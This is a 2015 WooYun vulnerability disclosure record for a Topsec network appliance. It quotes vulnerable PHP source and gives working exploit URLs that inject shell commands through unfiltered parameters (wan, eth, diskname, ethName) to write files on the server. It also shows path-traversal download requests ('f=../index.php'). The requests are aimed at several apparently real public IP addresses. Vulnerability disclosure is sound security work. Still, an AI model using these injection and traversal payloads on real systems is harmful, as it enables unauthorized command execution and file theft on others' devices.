{"id": 48349, "wybug_id": "wooyun-2015-0117616", "wybug_title": "天融信某系统前台无需登录命令执行多处及任意文件下载", "wybug_corp": "天融信", "wybug_author": "路人甲", "wybug_date": "2015-06-02 11:54", "wybug_open_date": "2015-09-02 17:06", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-07：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-07-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-02：\t细节向公众公开  简要描述：  详细说明：  redial_pppoe.php：\n<?php require_once dirname(__FILE__).\"/../common/appexConfigInterface.inc\";$appexInterface = new AppexConfigInterface();$wanName = $_GET['wan'];$appexInterface->ifDownInterface($wanName);$appexInterface->ifUpInterface($wanName);?>\n第一处:ifDownInterface\nprivate $ifDownCmdFormat = \"/sbin/ifdown %s > /dev/null\";................................public function ifDownInterface($ifName){\t\t\t\t$command = sprintf ( $this->ifDownCmdFormat, $ifName );\t\t//echo ($command);\t\texecute ( $command );\t}\n第二处\nprivate $ifUpCmdFormat = \"/sbin/ifup %s > /dev/null\";...................public function ifUpInterface($ifName){\t\t\t\t\t$command = sprintf ( $this->ifUpCmdFormat, $ifName );\t\t//echo ($command);\t\texecute ( $command );\t}\nhttp://218.206.217.19:8080/acc/network/redial_pppoe.php?wan= | echo wooyun > d.php |访问:http://218.206.217.19:8080/acc/network/d.php 即可第三处：check_interface_stat.php：\n<?php include_once dirname(__FILE__).'/common/commandWrapper.inc';header('Cache-Control: no-cache');header('Pragma: no-cache');header('Expires: ' . gmdate(DATE_RFC1123, time()-1));$eth = $_GET['eth'];$cmd = \"ifconfig \".$eth.\" up\";\texec($cmd );$linkStatArray = getLinkStat($eth );$linkStat = \"\";if (strpos ( $eth, \"ppp\" ) > - 1) {\tif(count($linkStatArray)>1){\t\tif($linkStatArray[3]==\"yes\"){\t\t\t$linkStat = \" Connected \";\t\t\t}else{\t\t\t$linkStat = \" Not Connected\";\t\t}\t  }\t\t\t\t\t}else{\t  if(count($linkStatArray)>1){\t\tif($linkStatArray[3]==\"yes\"){\t\t\t$linkStat = \" Speed: \".$linkStatArray[0].\" | Duplex: \".$linkStatArray[1].\" | Auto-negotiation: \".$linkStatArray[2];\t\t\t}else{\t\t\t$linkStat = \" Not Connected\";\t\t}\t  }\t\t\t\t\t\t\t\t\t  }\t\t\t\t\t\t\t\t ?>\nhttp://218.206.217.19:8080/acc/network/interface/check_interface_stat.php?eth= | echo wooyun > h.php |访问:http://218.206.217.19:8080/acc/network/interface/h.php 即可第四处：fdisk_action.php:\n<?php require_once dirname(__FILE__).\"/../common/commandWrapper.inc\";$action = $_GET['action'];$diskname = $_GET['diskname'];$setTosize= $_GET['setTosize'];if($action==\"1\"){\tfdiskSD($diskname,$setTosize);}?>\n跟进fdiskSD\nfunction fdiskSD($disk,$size){\t\t$command = \" fdisk -l | grep \".$disk.\"2\";\t$result = execute($command);\t$infoArr = $result->get('output');\tif(count($infoArr)==0){\t\t$command = \"echo -e 'd\\n1\\nd\\nw\\nq\\n' | fdisk \".$disk.\" \";\t\t$result = execute($command);\t\tsleep(1);\t\t$command = \"echo -e 'p\\nq\\n' | fdisk \".$disk;\t\t$result = execute($command);\t\tsleep(1);\t\t$allInfoArr = $result->get('output');\t\t$tmpArr = split(\"[ ]+\",$allInfoArr[3] );\t\t$diskBlockSize = $tmpArr[4];\t\t$sda2Size=$diskBlockSize/100*$size;\t\techo $diskBlockSize.\"---\".$sda2Size;\t\t$command = \"/tmp/appexcfg/bin/fdisk \".$disk.\" \".$sda2Size.\" >/dev/null & \";\t\texecute($command);\t}else{\t\t$command = \"echo -e 'p\\nq\\n' | fdisk \".$disk;\t\t$result = execute($command);\t\t$allInfoArr = $result->get('output');\t\tsleep(1);\t\t$tmpArr = split(\"[ ]+\",$allInfoArr[3] );\t\t$diskBlockSize = $tmpArr[4];\t\t$sda2Size=$diskBlockSize/100*$size;\t\t$command = \"/tmp/appexcfg/bin/fdisk \".$disk.\" \".$sda2Size.\" >/dev/null & \";\t\texecute($command);\t}\t}\nurl:http://218.206.217.19:8080/acc/fdisk/fdisk_action.php?action=1&diskname=1 | echo wooyun > k.php | &setTosize=10访问：http://218.206.217.19:8080/acc/fdisk/k.php 即可static_restart_arp_action.php:\n$networkDAO = new NetworkDao();$ethName = \"\";if(isset($_REQUEST['ethName'])){\t$ethName = $_REQUEST['ethName'];\t}$isRestart=\"0\";if(isset($_REQUEST['isRestart'])){\t$isRestart = $_REQUEST['isRestart'];\t}$macFilterEnable= $networkDAO->getNetworkConfigItemValue($ethName,\"macFilterEnable\");$macFilterFixed= $networkDAO->getNetworkConfigItemValue($ethName,\"macFilterFixed\");$macFilterAllowOthers= $networkDAO->getNetworkConfigItemValue($ethName,\"macFilterAllowOthers\");$macDhcpEnable= $networkDAO->getNetworkConfigItemValue($ethName,\"macDhcpEnable\");$macFilter=\"0\";$lanIfs = $networkDAO->getNetworkConfigItemValue(\"routerlan\",\"ifname\");$lanIfs = trim ( $lanIfs );$lanNameArray = split ( '[ ]+', $lanIfs );foreach ($lanNameArray as $lanName){\t$lanMacFilterEnable=$networkDAO->getNetworkConfigItemValue($lanName,\"macFilterEnable\");\n跟进getNetworkConfigItemValue：\nclass NetworkDao extends UCIBaseDao{\t\tpublic function setNetworkConfigItemValue($config,$option,$value){\t\tparent::set(\"network\",$config,$option,$value);\t}\t\tpublic function setNetworkConfigValue($config,$value){\t\tparent::setConfig(\"network\",$config,$value);\t}\t\tpublic function getNetworkConfigItemValue($config,$option){\t\t\t\t$result = parent::get(\"network\",$config,$option);\t\treturn \t$result;\t}\n再跟进父类:\nclass UCIBaseDao{\t\t\tpublic function set($package,$config,$option,$value){\t\t$cmd = UCI_CMD.\" set \".$package.\".\".$config.\".\".$option.\"='\".$value.\"'\";\t\texec($cmd);\t}\t\tpublic function setConfig($package,$config,$value){\t\t$cmd = UCI_CMD.\" set \".$package.\".\".$config.\"=\".$value;\t\texec($cmd);\t}\t\tpublic function commit($package){\t\t//$cmd = UCI_CMD.\" commit \";\t\t$cmd = UCI_CMD.\" commit \".$package;\t\texec($cmd);\t}\t\tpublic function get($package,$config,$option){\t\t$cmd = UCI_CMD.\" get \".$package.\".\".$config.\".\".$option;\t\t\t$result = exec($cmd);\t\treturn \t$result;\t}\n这里没有对config 和 option做过滤导致命令执行http://218.206.217.19:8080/acc/bindipmac/static_restart_arp_action.php?ethName= | echo wooyun > l.php | 访问url:http://218.206.217.19:8080/acc/bindipmac/l.php 即可 下来看第二处static_arp.php:\n<?phperror_reporting(E_ALL ^ E_WARNING ^ E_NOTICE);include_once dirname(__FILE__).'/../common/uiResources.inc';require_once dirname(__FILE__).'/../common/appexConfigInterface.inc';require_once dirname(__FILE__).'/../common/config/dao/engineInterfaceDao.inc';require_once dirname(__FILE__).'/../common/config/dao/arpDao.inc';require_once dirname(__FILE__).'/../common/config/model/appexEngineInterfaceModel.inc';require_once dirname(__FILE__).'/../common/config/dao/dhcpInterfaceDao.inc';include_once dirname(__FILE__).'/../common/commandWrapper.inc';require_once dirname ( __FILE__ ) . \"/../common/UciUtil.inc\";require_once dirname ( __FILE__ ) . \"/../common/config/uci/dao/networkDao.inc\";header('Cache-Control: no-cache');header('Pragma: no-cache');header('Expires: ' . gmdate(DATE_RFC1123, time()-1));$arpDao = new ARPDao();$ethName = \"\";if(isset($_GET['ethName'])){\t$ethName = $_GET['ethName'];\t}$engineInterfaceDao = new EngineInterfaceDao();$lanEngineIf = $engineInterfaceDao->getIfConfigForIfname($ethName);\t$ifName = $ethName; $networkDAO = new NetworkDao();$macFilterEnable= $networkDAO->getNetworkConfigItemValue($ethName,\"macFilterEnable\");$macFilterFixed= $networkDAO->getNetworkConfigItemValue($ethName,\"macFilterFixed\");$macFilterAllowOthers= $networkDAO->getNetworkConfigItemValue($ethName,\"macFilterAllowOthers\");$macDhcpEnable= $networkDAO->getNetworkConfigItemValue($ethName,\"macDhcpEnable\");$visitNum = date('YjnHis');?>\n这里有2处getIfConfigForIfnamegetNetworkConfigItemValue跟进第一个：\npublic function getIfConfigForIfname($ifname) {\t\t$networkDAO = new NetworkDao ( );\t\t$engineInterfaceModel = new AppExEngineInterfaceModel ( );\t\t$engineInterfaceModel->setName($ifname);\t\t$engineInterfaceModel->setDns($networkDAO->getNetworkConfigItemValue ( $ifname, \"dns\" ));\t\t$engineInterfaceModel->setGetway($networkDAO->getNetworkConfigItemValue ( $ifname, \"gateway\" ));\t\t$engineInterfaceModel->setIfAlias($networkDAO->getNetworkConfigItemValue ( $ifname, \"alias\" ));\t\t$engineInterfaceModel->setIfAutoNeg($networkDAO->getNetworkConfigItemValue ( $ifname, \"autoneg\" ));\t\t$engineInterfaceModel->setIfDuplex($networkDAO->getNetworkConfigItemValue ( $ifname, \"duplex\" ));\t\t$engineInterfaceModel->setIfName($networkDAO->getNetworkConfigItemValue ( $ifname, \"ifname\" ));\t\t$engineInterfaceModel->setIfSpeed($networkDAO->getNetworkConfigItemValue ( $ifname, \"speed\" ));\t\t$engineInterfaceModel->setIfType($networkDAO->getNetworkConfigItemValue ( $\n最终还是跑到了这个getNetworkConfigItemValue 里面原理不多分析了http://61.54.222.33:8080 http://61.148.24.182:8080/ http://61.54.222.39:8080/ http://61.148.24.182:8080任意文件下载download.php:\n<?php\t$file = $_REQUEST['f'];\tif(!file_exists('/www/cert/'))\t\tmkdir('/www/cert/');\tif(!file_exists(\"/www/cert/$file\"))\t\tcopy(\"/etc/easy-rsa/keys/$file\", \"/www/cert/$file\");\t\t\theader('Content-type: application/x-msdownload');\theader('Content-Disposition: attachment; filename=\"' . $file . '\"');\treadfile(\"/www/cert/$file\");?>\n只要文件存在 就不走里面的copyhttp://61.54.222.33:8080/acc/vpn/download.php?f=../index.phphttp://61.148.24.182:8080/acc/vpn/download.php?f=../index.phphttp://61.54.222.39:8080/acc/vpn/download.php?f=../index.phphttp://61.148.24.182:8080/acc/vpn/download.php?f=../index.phphttp://218.206.217.19:8080/acc/vpn/download.php?f=../index.php   漏洞证明：     修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：1  确认时间：2015-06-04 17:05 厂商回复： 已经收到其它网站漏洞报送，谢谢关注 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-06-02 12:01 |    \t\tManning \t\t\t( 普通白帽子  |\t\t\t        Rank:559 漏洞数:78        | 就恨自己服务器太少)\t\t \n  xfkxfk刚在360提的，怎么wooyun又有了？    \n     2015-06-02 13:04 |    \t\txfkxfk  \t\t\t( 核心白帽子 |\t\t\t        Rank:2179 漏洞数:338        | 呵呵！)\t\t \n  @Manning TopAPP-WO广域网优化系统？我29号提交的还没通过。。。    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 1, "Ranks": null}